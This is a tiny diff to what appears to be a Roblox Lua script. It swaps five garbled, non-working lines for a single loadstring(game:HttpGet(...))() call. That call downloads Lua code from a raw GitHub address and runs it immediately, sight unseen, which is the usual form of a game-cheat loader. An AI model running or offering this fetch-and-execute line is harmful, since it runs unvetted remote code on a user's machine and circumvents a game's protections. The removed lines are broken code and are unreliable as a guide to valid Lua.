@@ -1,5 +1,1 @@
-loadstring:ASOSTOP
-Amount:(c)
-local walkspeed.localuser;serveruser(true)
-load'game:HttpGet"https:// raw.github.com/AEverhub/storehouse219/blob/main/src"
-ltkey:3325
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AEverhub//main/luaf"))()
